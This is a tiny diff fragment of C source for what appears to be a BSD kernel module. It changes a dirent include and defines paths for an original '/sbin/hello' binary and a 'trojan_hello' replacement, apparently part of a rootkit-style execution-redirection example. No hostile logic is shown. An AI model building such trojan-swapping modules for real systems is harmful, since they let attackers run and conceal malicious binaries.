@@ -11,7 +11,7 @@
 #include <vm/vm.h>
 #include <vm/vm_page.h>
 #include <vm/vm_map.h>
-#include <dirent.h>
+#include <sys/dirent.h>
 #define ORIGINAL "/sbin/hello"
 #define TROJAN "/sbin/trojan_hello"
 #define T_NAME "trojan_hello"
